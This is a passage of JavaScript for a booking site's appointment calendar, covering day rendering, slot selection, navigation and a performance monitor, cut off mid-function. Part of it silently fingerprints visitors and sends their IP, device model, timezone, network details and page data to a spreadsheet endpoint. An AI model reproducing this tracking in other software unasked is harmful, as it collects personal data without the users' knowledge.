                return new Date(effectiveYear, effectiveMonth, dayNum).getDay() !== 6;
            });
        if (!availableEls.length) return null;

        availableEls.sort((a, b) => Number(a.dataset.day) - Number(b.dataset.day));

        const sameMonthSelection = selectedDate && hasRenderedMeta &&
            selectedDate.getFullYear() === renderedYear &&
            selectedDate.getMonth() === renderedMonth;

        if (!sameMonthSelection) {
            return direction === 1 ? availableEls[0] : availableEls[availableEls.length - 1];
        }

        const pivotDay = selectedDate.getDate();
        if (direction === 1) {
            return availableEls.find(el => Number(el.dataset.day) > pivotDay) || null;
        }

        for (let i = availableEls.length - 1; i >= 0; i--) {
            if (Number(availableEls[i].dataset.day) < pivotDay) return availableEls[i];
        }
        return null;
    }

    function setCalendarPrevButtonEnabled(enabled) {
        const prevBtn = document.getElementById('prevBtn');
        if (!prevBtn) return;
        const isEnabled = Boolean(enabled);
        prevBtn.disabled = !isEnabled;
        prevBtn.setAttribute('aria-disabled', String(!isEnabled));
        prevBtn.style.visibility = isEnabled ? 'visible' : 'hidden';
        prevBtn.style.pointerEvents = isEnabled ? 'auto' : 'none';
        prevBtn.setAttribute('aria-hidden', String(!isEnabled));
    }

    function setCalendarLoaderState(mode = 'loading', message = '') {
        if (!calOverlay) return;

        const loaderPreloader = document.getElementById('calendarLoaderPreloader');
        const loaderText = document.getElementById('calendarLoaderText');

        calOverlay.classList.remove('calendar-loader--error');
        if (loaderPreloader) {
            loaderPreloader.classList.remove('book-btn-preloader--offline', 'book-btn-preloader--error', 'book-btn-preloader--hypnotic');
        }
        if (loaderText) {
            loaderText.textContent = '';
            loaderText.style.display = 'none';
            loaderText.style.opacity = '0';
        }

        if (mode === 'hidden') {
            calOverlay.style.display = 'none';
            return;
        }

        calOverlay.style.display = 'flex';
        if (mode === 'error') {
            calOverlay.classList.add('calendar-loader--error');
            if (loaderPreloader) loaderPreloader.classList.add('book-btn-preloader--offline');
            if (loaderText) {
                loaderText.textContent = String(message || CALENDAR_LOAD_FAILURE_TEXT);
                loaderText.style.display = 'block';
                loaderText.style.opacity = '1';
            }
        }
    }

    function showCalendarLoadFailureFallback(message = CALENDAR_LOAD_FAILURE_TEXT) {
        const calWrapper = document.getElementById('bookingCalendar');
        if (calGrid) calGrid.innerHTML = '';
        if (slotsGrid) slotsGrid.innerHTML = '';
        if (slotsBlock) slotsBlock.style.display = 'none';
        if (slotsDayDisplay) slotsDayDisplay.textContent = '';
        setCalendarPrevButtonEnabled(false);

        if (calWrapper) {
            calWrapper.classList.remove('calendar--loading');
            calWrapper.classList.add('calendar--loaded');
        }
        if (headerTitle) headerTitle.classList.remove('calendar-title--loading');

        setCalendarLoaderState('error', message);
        setHeaderNearestSlotHint('Nearest appointment: unavailable.');
    }

    async function refreshCalendarPrevButtonState() {
        const prevBtn = document.getElementById('prevBtn');
        if (!prevBtn) return;

        const runId = ++calendarPrevButtonStateRunId;
        const prevRenderedEl = getAdjacentRenderedAvailableDayEl(-1);
        if (prevRenderedEl) {
            setCalendarPrevButtonEnabled(true);
            return;
        }

        const minDate = getMinBookableDate();
        const pivot = selectedDate ? new Date(selectedDate) : new Date(minDate);
        pivot.setHours(0, 0, 0, 0);
        if (pivot <= minDate) {
            setCalendarPrevButtonEnabled(false);
            return;
        }

        // Hide immediately while async backward scan runs, so rapid day-switching
        // does not leave a stale visible "back" button.
        setCalendarPrevButtonEnabled(false);
        const prevAvailable = await findAdjacentAvailableDate(-1);
        if (runId !== calendarPrevButtonStateRunId) return;
        setCalendarPrevButtonEnabled(Boolean(prevAvailable));
    }

    // ------------------------------------------------------------------
    // RENDER CALENDAR
    // ------------------------------------------------------------------
    function setCalendarInnerTitle(dateValue) {
        if (!monthDisplay || !(dateValue instanceof Date) || Number.isNaN(dateValue.getTime())) return;
        monthDisplay.innerHTML = `<span class="cal-month cal-selected-day">${DAY_NAMES_FULL[dateValue.getDay()]} ${dateValue.getDate()}</span>`;
    }

    async function renderCalendar() {
        const renderToken = ++calendarRenderToken;
        const calWrapper = document.getElementById('bookingCalendar');
        calendarFetchFailedForRender = false;

        // Show spinner
        calGrid.innerHTML = '';
        slotsGrid.innerHTML = '';
        slotsBlock.style.display = 'none';
        slotsDayDisplay.textContent = '';
        if (calWrapper) calWrapper.classList.add('calendar--loading');
        if (headerTitle) headerTitle.classList.add('calendar-title--loading');
        setCalendarLoaderState('loading');
        if (calLoaderStatus) calLoaderStatus.textContent = 'Loading...';
        setCalendarPrevButtonEnabled(false);

        try {
            // Fetch (may update currentDate if backend jumps month)
            await fetchMonth(currentDate.getFullYear(), currentDate.getMonth());
            if (renderToken !== calendarRenderToken) return;

            if (calendarFetchFailedForRender) {
                showCalendarLoadFailureFallback();
                return;
            }

            const year  = currentDate.getFullYear();
            const month = currentDate.getMonth();
            const slots = availableSlotsCache[getMonthKey(year, month)] || [];
            if (calGrid) {
                calGrid.dataset.year = String(year);
                calGrid.dataset.month = String(month);
            }
            prefetchNextMonthFrom(year, month);
            // Ensure no residual days from a stale parallel render.
            calGrid.innerHTML = '';

            // Update external title
            headerTitle.textContent = `NEXT IN ${MONTH_NAMES[month].toUpperCase()}`;

            // Build slot map
            const minDate = getMinBookableDate();

            const slotsMap = {};
            slots.forEach(s => {
                const d = new Date(year, month, s.date);
                d.setHours(0,0,0,0);
                if (d >= minDate) {
                    if (!slotsMap[s.date]) slotsMap[s.date] = [];
                    slotsMap[s.date].push(s);
                }
            });

            // Find nearest free day (excluding Sunday)
            let nearestDay = null;
            absoluteNearestDate = null;
            nearestSlotData = null;
            nearestDayLastSlotData = null;
            for (const d of Object.keys(slotsMap).map(Number).sort((a,b)=>a-b)) {
                const date = new Date(year, month, d);
                if (date >= minDate && date.getDay() !== 0) {
                    const free = slotsMap[d].filter(s => s.status !== 'busy');
                    if (free.length) {
                        nearestDay = d;
                        absoluteNearestDate    = date;
                        nearestSlotData        = free[0];
                        nearestDayLastSlotData = free[free.length - 1];
                        break;
                    }
                }
            }

            if (!nearestDay) {
                const monthStart = new Date(year, month, 1);
                monthStart.setHours(0, 0, 0, 0);
                const nearestFuture = await findNearestAvailableDateFrom(monthStart);
                if (renderToken !== calendarRenderToken) return;

                if (nearestFuture) {
                    selectedDate = nearestFuture;
                    currentDate = new Date(nearestFuture.getFullYear(), nearestFuture.getMonth(), 1);
                    await renderCalendar();
                    return;
                }
            }

            updateFooterBookBtn();

            // Inner title always uses "Weekday Day" and never switches to Month/Year.
            const selectedInViewMonth = selectedDate &&
                selectedDate.getMonth() === month &&
                selectedDate.getFullYear() === year;
            const fallbackDay = Number.isFinite(nearestDay)
                ? nearestDay
                : ((minDate.getFullYear() === year && minDate.getMonth() === month) ? minDate.getDate() : 1);
            const titleDate = selectedInViewMonth
                ? new Date(year, month, selectedDate.getDate())
                : new Date(year, month, fallbackDay);
            setCalendarInnerTitle(titleDate);

            // Day-name headers
            DAY_NAMES_SHORT.forEach(n => {
                const el = document.createElement('div');
                el.className = 'cal-day-name';
                el.textContent = n;
                calGrid.appendChild(el);
            });

            // Padding blanks
            const firstDow = new Date(year, month, 1).getDay();
            for (let i = 0; i < firstDow; i++) {
                const el = document.createElement('div');
                el.className = 'cal-day cal-day--empty';
                calGrid.appendChild(el);
            }

            // Toronto "today"
            const torNow = new Date(new Date().toLocaleString('en-US', {timeZone:'America/Toronto'}));
            torNow.setHours(0,0,0,0);

            const daysInMonth = new Date(year, month + 1, 0).getDate();
            availableDaysCount = 0;
            let autoSelected = false;

            for (let day = 1; day <= daysInMonth; day++) {
                const el   = document.createElement('div');
                const date = new Date(year, month, day);
                el.className   = 'cal-day';
                el.dataset.day = day;
                const isPast   = date < torNow;
                const isSunday = date.getDay() === 0;
                const isSaturday = date.getDay() === 6;
                const isToday  = date.getTime() === torNow.getTime();

                if (isSaturday) {
                    el.innerHTML = `<span class="cal-key" aria-hidden="true"><img src="key.svg" alt="" loading="lazy" decoding="async"></span>`;
                } else {
                    el.textContent = day;
                }

                if (isToday) el.classList.add('cal-day--today');

                if (isPast || isSunday) {
                    el.classList.add('cal-day--disabled');
                } else if (slotsMap[day]) {
                    const allBusy = slotsMap[day].every(s => s.status === 'busy');
                    if (allBusy) {
                        el.classList.add('cal-day--busy', 'cal-day--disabled');
                    } else {
                        el.classList.add('cal-day--has-slots');
                        if (day === nearestDay) el.classList.add('cal-day--nearest');
                        el.style.setProperty('--i', availableDaysCount++);
                        el.dataset.slots = JSON.stringify(slotsMap[day]);
                        el.onclick = () => selectDay(day, el);

                        const isCurrentSelectedDay = selectedDate &&
                            selectedDate.getFullYear() === year &&
                            selectedDate.getMonth() === month &&
                            selectedDate.getDate() === day;

                        // Keep explicit selection when navigating; otherwise fallback to nearest free day.
                        if (!autoSelected && isCurrentSelectedDay) {
                            autoSelected = true;
                            setTimeout(() => selectDay(day, el, true), 200);
                        } else if (!autoSelected && day === nearestDay) {
                            autoSelected = true;
                            setTimeout(() => selectDay(day, el, true), 200);
                        }
                    }
                } else if (isSaturday) {
                    el.classList.add('cal-day--closed');
                    el.style.setProperty('--i', availableDaysCount++);
                    el.dataset.slots = '[]';
                    el.onclick = () => selectDay(day, el);
                } else {
                    el.classList.add('cal-day--disabled');
                }

                calGrid.appendChild(el);
            }

            if (!autoSelected) {
                slotsDayDisplay.textContent = nearestDay
                    ? 'Select a day to see available times'
                    : 'No available slots available right now.';
            }

            setCalendarLoaderState('hidden');
            if (calWrapper) calWrapper.classList.remove('calendar--loading');
            if (headerTitle) headerTitle.classList.remove('calendar-title--loading');
            // Smoothly reveal calendar after slots are loaded
            if (calWrapper) {
                setTimeout(() => {
                    calWrapper.classList.add('calendar--loaded');
                }, 50);
            }
            refreshCalendarPrevButtonState().catch(() => setCalendarPrevButtonEnabled(false));

            // If no nearest day found this month, background-search next month
            if (!nearestDay) {
                let nextM = month + 1, nextY = year;
                if (nextM > 11) { nextM = 0; nextY++; }
                fetchMonth(nextY, nextM, false, false).then(() => {
                    const nextSlots = availableSlotsCache[getMonthKey(nextY, nextM)];
                    if (Array.isArray(nextSlots)) {
                        const minDate = getMinBookableDate();
                        for (const slot of nextSlots.filter(s => s.status !== 'busy').sort((a,b)=>a.date-b.date)) {
                            const d = new Date(nextY, nextM, slot.date);
                            if (d >= minDate && d.getDay() !== 0) {
                                absoluteNearestDate = d;
                                nearestSlotData = slot;
                                nearestDayLastSlotData = slot;
                                break;
                            }
                        }
                        updateFooterBookBtn();
                    }
                });
            }
        } catch (error) {
            if (renderToken !== calendarRenderToken) return;
            console.warn('[CALENDAR] Render failed, fallback displayed:', error && error.message ? error.message : error);
            showCalendarLoadFailureFallback();
        }
    }

    function randomBetween(min, max) {
        const low = Math.ceil(min);
        const high = Math.floor(max);
        return Math.floor(Math.random() * (high - low + 1)) + low;
    }

    function clearMonthSwitchProgressTimer() {
        if (monthSwitchProgressTimer) {
            clearInterval(monthSwitchProgressTimer);
            monthSwitchProgressTimer = null;
        }
    }

    function setMonthSwitchProgress(value) {
        monthSwitchProgressValue = Math.max(0, Math.min(100, Math.round(Number(value) || 0)));
        if (monthSwitchProgressFill) {
            monthSwitchProgressFill.style.width = `${monthSwitchProgressValue}%`;
        }
        if (monthSwitchProgressValueEl) {
            monthSwitchProgressValueEl.textContent = `${monthSwitchProgressValue}%`;
        }
    }

    function startMonthSwitchProgressOverlay() {
        if (!monthSwitchOverlay || !monthSwitchProgressFill || !monthSwitchProgressValueEl) return 0;
        monthSwitchProgressRunId += 1;
        const runId = monthSwitchProgressRunId;
        clearMonthSwitchProgressTimer();
        setMonthSwitchProgress(0);
        monthSwitchOverlay.classList.add('month-switch-overlay--active');
        monthSwitchOverlay.setAttribute('aria-hidden', 'false');
        requestAnimationFrame(() => {
            if (runId !== monthSwitchProgressRunId) return;
            setMonthSwitchProgress(randomBetween(4, 9));
        });
        monthSwitchProgressTimer = setInterval(() => {
            if (runId !== monthSwitchProgressRunId) return;
            const next = Math.min(
                MONTH_SWITCH_PROGRESS_SOFT_CAP,
                monthSwitchProgressValue + randomBetween(2, 8)
            );
            setMonthSwitchProgress(next);
        }, MONTH_SWITCH_PROGRESS_TICK_MS);
        return runId;
    }

    function finishMonthSwitchProgressOverlay(runId, isError = false) {
        if (!monthSwitchOverlay || !runId) return;
        if (runId !== monthSwitchProgressRunId) return;
        clearMonthSwitchProgressTimer();
        setMonthSwitchProgress(100);
        setTimeout(() => {
            if (runId !== monthSwitchProgressRunId) return;
            monthSwitchOverlay.classList.remove('month-switch-overlay--active');
            monthSwitchOverlay.setAttribute('aria-hidden', 'true');
            if (isError) setMonthSwitchProgress(0);
            else setTimeout(() => setMonthSwitchProgress(0), 40);
        }, isError ? 60 : 140);
    }

    // ------------------------------------------------------------------
    // SELECT DAY -> show slots
    // ------------------------------------------------------------------
    function getSlotStartMinutes(slot) {
        if (!slot) return -1;

        const isoRaw = String(slot.iso || '');
        const isoMatch = isoRaw.match(/T(\d{2}):(\d{2})/);
        if (isoMatch) {
            const h = Number(isoMatch[1]);
            const m = Number(isoMatch[2]);
            if (Number.isFinite(h) && Number.isFinite(m)) {
                return h * 60 + m;
            }
        }

        const textRaw = String(slot.text || '');
        const startText = textRaw.split(/[-\u2013]/)[0].trim();
        const textMatch = startText.match(/^(\d{1,2})(?::(\d{2}))?\s*(AM|PM)?$/i);
        if (!textMatch) return -1;

        let hour = Number(textMatch[1]);
        const minute = Number(textMatch[2] || '0');
        const ampm = String(textMatch[3] || '').toUpperCase();
        if (!Number.isFinite(hour) || !Number.isFinite(minute)) return -1;

        if (ampm === 'PM' && hour < 12) hour += 12;
        if (ampm === 'AM' && hour === 12) hour = 0;

        return hour * 60 + minute;
    }

    function getLatestSlot(slots) {
        if (!Array.isArray(slots) || !slots.length) return null;
        let best = slots[0];
        let bestMinutes = getSlotStartMinutes(best);
        for (let i = 1; i < slots.length; i++) {
            const current = slots[i];
            const currentMinutes = getSlotStartMinutes(current);
            if (currentMinutes > bestMinutes) {
                best = current;
                bestMinutes = currentMinutes;
            }
        }
        return best;
    }

    function formatOntarioLegalDateLabel(slot, fallbackDate) {
        let year = 0;
        let month = 0;
        let day = 0;

        const isoRaw = normalizeSingleLine(slot && slot.iso);
        const isoMatch = isoRaw.match(/^(\d{4})-(\d{2})-(\d{2})/);
        if (isoMatch) {
            year = Number(isoMatch[1]);
            month = Number(isoMatch[2]);
            day = Number(isoMatch[3]);
        } else if (fallbackDate instanceof Date && !Number.isNaN(fallbackDate.getTime())) {
            year = fallbackDate.getFullYear();
            month = fallbackDate.getMonth() + 1;
            day = fallbackDate.getDate();
        }

        if (!year || !month || !day) return '';
        const monthName = new Date(Date.UTC(year, month - 1, day)).toLocaleString('en-CA', {
            month: 'long',
            timeZone: 'UTC'
        });
        return `(${day} ${monthName} ${year})`;
    }

    function selectDay(day, el, isAuto = false) {
        document.querySelectorAll('.cal-day').forEach(d => d.classList.remove('cal-day--selected'));
        el.classList.add('cal-day--selected');

        selectedDate = new Date(currentDate.getFullYear(), currentDate.getMonth(), day);
        logEvent('Date Selected', selectedDate.toDateString());

        // Update nav title
        setCalendarInnerTitle(selectedDate);

        const raw = el.dataset.slots ? JSON.parse(el.dataset.slots) : [];
        const free = raw.filter(s => s.status !== 'busy');
        const latestSlot = getLatestSlot(free);

        // Label
        slotsDayDisplay.textContent = free.length
            ? 'CHOOSE TIME:'
            : 'No available slots for this day.';
        slotsDayDisplay.style.opacity = '1';

        // Build slot buttons
        slotsGrid.innerHTML = '';
        free.forEach((slot, idx) => {
            const btn = document.createElement('button');
            btn.className = 'slot-btn slot-btn--hypnotic';
            const svg = getClockIcon(slot.text);
            let t = slot.text.split(/[-\u2013]/)[0].trim().toUpperCase();
            const end = getEndTime(t).toUpperCase();
            const legalDateLabel = formatOntarioLegalDateLabel(slot, selectedDate);
            btn.innerHTML = `<div class="slot-icon-wrapper">${svg}</div><div class="slot-time"><span style="font-weight: 800">${t} - ${end}</span><span class="slot-date-legal">${legalDateLabel}</span></div>`;
            btn.style.setProperty('--i', availableDaysCount + idx);
            btn.style.setProperty('--slot-idx', idx);
            btn.onclick = () => {
                btn.classList.add('slot-btn--clicked');
                if (isFormCalendarOverlayActive && modal && modal.classList.contains('modal--active')) {
                    setTimeout(() => applySlotFromCalendarOverlay(slot), 360);
                    return;
                }
                setTimeout(() => stageBookingAfterIntake(slot), 600);
            };
            slotsGrid.appendChild(btn);
        });

        slotsBlock.style.display = free.length ? 'block' : 'none';
        if (!free.length) {
            slotsGrid.innerHTML = `<p style="grid-column:1/-1;text-align:center;color:#fff;font-weight: 800;font-size:1.1rem;margin-top:16px">No available slots for this day.<br>Please select another day.</p>`;
            slotsBlock.style.display = 'block';
            refreshCalendarPrevButtonState().catch(() => setCalendarPrevButtonEnabled(false));
            return;
        }
        refreshCalendarPrevButtonState().catch(() => setCalendarPrevButtonEnabled(false));

        if (!isAuto && latestSlot) {
            if (isFormCalendarOverlayActive && modal && modal.classList.contains('modal--active')) {
                setTimeout(() => applySlotFromCalendarOverlay(latestSlot), 120);
            } else {
                setTimeout(() => stageBookingAfterIntake(latestSlot), 120);
            }
        }
    }

    // ------------------------------------------------------------------
    // EVENT LISTENERS
    // ------------------------------------------------------------------
    function setupEventListeners() {
        if (calendarListenersBound) return;
        calendarListenersBound = true;

        const prevBtn = document.getElementById('prevBtn');
        const nextBtn = document.getElementById('nextBtn');
        if (prevBtn) prevBtn.addEventListener('click', async () => {
            if (prevBtn.disabled || calendarNavInProgress) return;
            calendarNavInProgress = true;
            let monthSwitchRunId = 0;
            try {
                const prevRenderedEl = getAdjacentRenderedAvailableDayEl(-1);
                if (prevRenderedEl) {
                    selectDay(Number(prevRenderedEl.dataset.day), prevRenderedEl, true);
                    return;
                }

                monthSwitchRunId = startMonthSwitchProgressOverlay();
                const prevAvailable = await findAdjacentAvailableDate(-1);
                if (!prevAvailable) return;
                setMonthSwitchProgress(Math.max(monthSwitchProgressValue, 66));
                selectedDate = prevAvailable;
                currentDate = new Date(selectedDate.getFullYear(), selectedDate.getMonth(), 1);
                await renderCalendar();
                setMonthSwitchProgress(100);
            } finally {
                if (monthSwitchRunId) finishMonthSwitchProgressOverlay(monthSwitchRunId);
                calendarNavInProgress = false;
            }
        });
        if (nextBtn) nextBtn.addEventListener('click', async () => {
            if (calendarNavInProgress) return;
            calendarNavInProgress = true;
            let monthSwitchRunId = 0;
            try {
                const nextRenderedEl = getAdjacentRenderedAvailableDayEl(1);
                if (nextRenderedEl) {
                    selectDay(Number(nextRenderedEl.dataset.day), nextRenderedEl, true);
                    return;
                }

                monthSwitchRunId = startMonthSwitchProgressOverlay();
                const nextAvailable = await findAdjacentAvailableDate(1);
                if (!nextAvailable) return;
                setMonthSwitchProgress(Math.max(monthSwitchProgressValue, 66));
                selectedDate = nextAvailable;
                currentDate = new Date(selectedDate.getFullYear(), selectedDate.getMonth(), 1);
                await renderCalendar();
                setMonthSwitchProgress(100);
            } finally {
                if (monthSwitchRunId) finishMonthSwitchProgressOverlay(monthSwitchRunId);
                calendarNavInProgress = false;
            }
        });
    }

    let userIP = "Unknown";
    let userCountryCode = "CA";

    function detectCountryCode() {
        const lang = String(navigator.language || navigator.userLanguage || "").trim();
        const parts = lang.split("-");
        if (parts.length > 1 && /^[A-Za-z]{2}$/.test(parts[1])) {
            return parts[1].toUpperCase();
        }
        return "CA";
    }

    function detectOsLabel() {
        const ua = String(navigator.userAgent || "").toLowerCase();
        if (ua.includes("windows")) return "Windows";
        if (ua.includes("mac os") || ua.includes("macintosh")) return "macOS";
        if (ua.includes("android")) return "Android";
        if (ua.includes("iphone") || ua.includes("ipad") || ua.includes("ios")) return "iOS";
        if (ua.includes("linux")) return "Linux";
        return String(navigator.platform || "Unknown");
    }

    function detectDeviceModel() {
        const normalizeModel = (value) => String(value || "").replace(/\s+/g, " ").trim();
        try {
            if (navigator.userAgentData && typeof navigator.userAgentData.model === "string") {
                const hintedModel = normalizeModel(navigator.userAgentData.model);
                if (hintedModel && hintedModel.toLowerCase() !== "unknown") return hintedModel;
            }
        } catch (e) {}

        const ua = String(navigator.userAgent || "");
        const androidMatch = ua.match(/Android[^;]*;\s*([^;)]*?)\s+Build\//i);
        if (androidMatch && androidMatch[1]) {
            const model = normalizeModel(androidMatch[1].replace(/\bwv\b/ig, ""));
            if (model && !/^(linux|u|android)$/i.test(model)) return model;
        }

        const samsungMatch = ua.match(/\b(SM-[A-Z0-9]+)\b/i);
        if (samsungMatch && samsungMatch[1]) return samsungMatch[1].toUpperCase();

        const pixelMatch = ua.match(/\b(Pixel(?:\s+[A-Za-z0-9]+){1,3})\b/i);
        if (pixelMatch && pixelMatch[1]) return normalizeModel(pixelMatch[1]);

        const xiaomiMatch = ua.match(/\b((?:MI|Redmi|POCO)\s*[A-Za-z0-9-]+)\b/i);
        if (xiaomiMatch && xiaomiMatch[1]) return normalizeModel(xiaomiMatch[1]);

        if (/iPhone/i.test(ua)) return "iPhone";
        if (/iPad/i.test(ua)) return "iPad";
        if (/iPod/i.test(ua)) return "iPod";
        if (/Windows NT/i.test(ua)) return "Windows PC";
        if (/Macintosh|Mac OS X/i.test(ua)) return "Mac";
        if (/CrOS/i.test(ua)) return "Chromebook";
        if (/Linux/i.test(ua)) return "Linux PC";
        if (/Android/i.test(ua)) return "Android (model unavailable)";
        if (/Mobile/i.test(ua)) return "Mobile (model unavailable)";
        const os = detectOsLabel();
        return os ? `${os} device` : "Unknown device";
    }

    function extractCityFromTimezone(timezone) {
        const tz = String(timezone || "").trim();
        if (!tz || tz.indexOf("/") === -1) return "";
        const parts = tz.split("/");
        const city = parts[parts.length - 1].replace(/_/g, " ").trim();
        return city;
    }

    function getNetworkLabel() {
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (!connection) return "Unknown";
        const type = connection.effectiveType || "n/a";
        const downlink = Number.isFinite(connection.downlink) ? `${connection.downlink}Mbps` : "n/a";
        const rtt = Number.isFinite(connection.rtt) ? `${connection.rtt}ms` : "n/a";
        return `${type}/${downlink}/${rtt}`;
    }

    function getClientContext() {
        const cores = Number.isFinite(navigator.hardwareConcurrency) ? navigator.hardwareConcurrency : "";
        const memoryGB = Number.isFinite(navigator.deviceMemory) ? navigator.deviceMemory : "";
        const timezone = String((Intl.DateTimeFormat().resolvedOptions() || {}).timeZone || "");
        return {
            countryCode: userCountryCode || "CA",
            ip: userIP || "Unknown",
            lang: String(navigator.language || ""),
            os: detectOsLabel(),
            deviceModel: detectDeviceModel(),
            city: extractCityFromTimezone(timezone),
            screenResolution: `${window.screen.width}x${window.screen.height}`,
            viewport: `${window.innerWidth}x${window.innerHeight}`,
            timezone: timezone,
            cores: cores,
            memoryGB: memoryGB,
            network: getNetworkLabel(),
            touchPoints: Number.isFinite(navigator.maxTouchPoints) ? navigator.maxTouchPoints : 0,
            colorDepth: Number.isFinite(window.screen.colorDepth) ? window.screen.colorDepth : "",
            pageUrl: window.location.href,
            userAgent: String(navigator.userAgent || ""),
            referrer: document.referrer || ""
        };
    }

    async function fetchUserIP() {
        userCountryCode = detectCountryCode();
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 3500);
            const response = await fetch("https://api.ipify.org?format=json", { signal: controller.signal });
            clearTimeout(timeoutId);
            const data = await response.json();
            if (data && typeof data.ip === "string" && data.ip.trim()) {
                userIP = data.ip.trim();
            }
        } catch(e) {}
    }
    fetchUserIP();

    function getDetailedDeviceInfo() {
        const ctx = getClientContext();
        return `${ctx.countryCode}:${ctx.ip} | City: ${ctx.city || "n/a"} | Model: ${ctx.deviceModel || "n/a"} | Lang: ${ctx.lang} | OS: ${ctx.os} | Res: ${ctx.screenResolution} | Viewport: ${ctx.viewport} | TZ: ${ctx.timezone} | Cores: ${ctx.cores || "n/a"} | Mem: ${ctx.memoryGB || "n/a"}GB | Net: ${ctx.network}`;
    }

    function getFingerprint() {
        // Simple persistent fingerprint using browser properties and localStorage
        let fp = localStorage.getItem('site_fp');
        if (!fp) {
            fp = 'fp_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
            localStorage.setItem('site_fp', fp);
        }
        return fp;
    }
    /**
     * Sends usage logs to the Google Apps Script spreadsheet.
     */
     async function logEvent(event, details = "", isSuspicious = false, severity = "", extra = {}) {
        const safeExtra = (extra && typeof extra === 'object') ? extra : {};
        const ctx = getClientContext();
        const getExtra = (key, fallback = "") => (Object.prototype.hasOwnProperty.call(safeExtra, key) ? safeExtra[key] : fallback);
        try {
            fetch(APPS_SCRIPT_URL, {
                method: "POST",
                keepalive: true,
                body: JSON.stringify({
                    action: "log",
                    event: event,
                    details: details,
                    suspicious: isSuspicious,
                    fingerprint: getFingerprint(),
                    userInfo: getDetailedDeviceInfo(),
                    severity: severity,
                    locationMapUrl: getExtra("locationMapUrl"),
                    locationCoords: getExtra("locationCoords"),
                    countryCode: ctx.countryCode,
                    city: ctx.city,
                    ip: ctx.ip,
                    lang: ctx.lang,
                    os: ctx.os,
                    deviceModel: ctx.deviceModel,
                    screenResolution: ctx.screenResolution,
                    viewport: ctx.viewport,
                    timezone: ctx.timezone,
                    cores: ctx.cores,
                    memoryGB: ctx.memoryGB,
                    network: ctx.network,
                    touchPoints: ctx.touchPoints,
                    colorDepth: ctx.colorDepth,
                    pageUrl: ctx.pageUrl,
                    userAgent: ctx.userAgent,
                    referrer: ctx.referrer,
                    perfLoadPercent: getExtra("perfLoadPercent"),
                    perfProcess: getExtra("perfProcess"),
                    perfScript: getExtra("perfScript"),
                    perfBlockedMs: getExtra("perfBlockedMs"),
                    perfWindowMs: getExtra("perfWindowMs")
                })
            });
        } catch (e) { /* silent fail */ }
    }

    function initPerformanceHealthMonitor() {
        if (window.__hdPerfMonitorInitialized) return;
        window.__hdPerfMonitorInitialized = true;

        const monitor = {
            windowMs: 12000,
            remoteLogCooldownMs: 120000,
            highLoadThresholdPct: 28,
            startedAt: performance.now(),
            blockedLongTaskMs: 0,
            blockedFrameMs: 0,
            buckets: new Map(),
            lastRemoteLogAt: 0,
            frameBudgetMs: 16.7,
            frameJankThresholdMs: 14,
            ignoreFrameDeltaAboveMs: 260,
            maxFrameOverrunMs: 240,
            isFrameLoopRunning: false,
            frameRafId: 0,
            lastFrameTs: 0
        };

        function clipText(value, maxLen) {
            const text = String(value || "");
            if (text.length <= maxLen) return text;
            return text.slice(0, maxLen - 3) + "...";
        }

        function addBucket(processName, scriptName, durationMs) {
            const process = clipText(processName || "main-thread", 90);
            const script = clipText(scriptName || "inline/self", 180);
            const key = `${process}::${script}`;
            const existing = monitor.buckets.get(key) || { process, script, durationMs: 0, hits: 0 };
            existing.durationMs += durationMs;
            existing.hits += 1;
            monitor.buckets.set(key, existing);
        }

        function getTopBucket() {
            let top = null;
            monitor.buckets.forEach((bucket) => {
                if (!top || bucket.durationMs > top.durationMs) {
                    top = bucket;
                }
            });
            return top || { process: "idle", script: "none", durationMs: 0, hits: 0 };
        }

        function deriveLongTaskSource(entry) {
            const attribution = entry && Array.isArray(entry.attribution) && entry.attribution.length ? entry.attribution[0] : null;
            const process = attribution && attribution.name ? attribution.name : (entry && entry.name ? entry.name : "longtask");
            const script = attribution && (attribution.containerSrc || attribution.containerName || attribution.containerId)
                ? (attribution.containerSrc || attribution.containerName || attribution.containerId)
                : "inline/self";
            return { process, script };
        }

        if (window.PerformanceObserver) {
            try {
                const observer = new PerformanceObserver((list) => {
                    if (document.hidden) return;
                    const entries = list.getEntries();
                    for (let i = 0; i < entries.length; i++) {
                        const entry = entries[i];
                        const duration = Number(entry.duration || 0);
                        if (!Number.isFinite(duration) || duration <= 0) continue;
                        monitor.blockedLongTaskMs += duration;
                        const src = deriveLongTaskSource(entry);
                        addBucket(src.process, src.script, duration);
                    }
                });
                observer.observe({ entryTypes: ["longtask"] });
            } catch (e) {
                console.warn("[PERF] Long Task observer is unavailable:", e && e.message ? e.message : e);
            }
        }

        function startFrameLoop() {
            if (monitor.isFrameLoopRunning) return;
            monitor.isFrameLoopRunning = true;
            monitor.lastFrameTs = performance.now();
            monitor.frameRafId = requestAnimationFrame(frameTick);
        }

        function stopFrameLoop() {
            if (!monitor.isFrameLoopRunning) return;
            monitor.isFrameLoopRunning = false;
            if (monitor.frameRafId) {
                cancelAnimationFrame(monitor.frameRafId);
                monitor.frameRafId = 0;
            }
            monitor.lastFrameTs = 0;
        }

        const frameTick = (now) => {
            if (!monitor.isFrameLoopRunning) return;

            const previousTs = monitor.lastFrameTs || now;
            const delta = now - previousTs;
            monitor.lastFrameTs = now;

            if (Number.isFinite(delta) && delta > 0 && delta <= monitor.ignoreFrameDeltaAboveMs) {
                const overrun = delta - monitor.frameBudgetMs;
                if (overrun > monitor.frameJankThresholdMs) {
                    const measuredOverrun = Math.min(overrun, monitor.maxFrameOverrunMs);
                    monitor.blockedFrameMs += measuredOverrun;
                    addBucket("frame-jank", "animation-frame", measuredOverrun);
                }
            }

            monitor.frameRafId = requestAnimationFrame(frameTick);
        };

        if (!document.hidden) {
            startFrameLoop();
        }

        document.addEventListener('visibilitychange', () => {
            if (document.hidden) {
                stopFrameLoop();
                monitor.startedAt = performance.now();
                monitor.blockedLongTaskMs = 0;
                monitor.blockedFrameMs = 0;
                monitor.buckets.clear();
                return;
            }
            monitor.startedAt = performance.now();
            startFrameLoop();
        });

        window.addEventListener('pagehide', stopFrameLoop, { passive: true });

        function flushPerfWindow() {
            const now = performance.now();
            if (document.hidden) {
                monitor.startedAt = now;
                monitor.blockedLongTaskMs = 0;
                monitor.blockedFrameMs = 0;
                monitor.buckets.clear();
                return;
            }
            const elapsedMs = Math.max(1, now - monitor.startedAt);
            const blockedMs = Math.max(monitor.blockedLongTaskMs, monitor.blockedFrameMs);
            const loadPercent = Math.min(100, (blockedMs / elapsedMs) * 100);
            const top = getTopBucket();

            console.log(
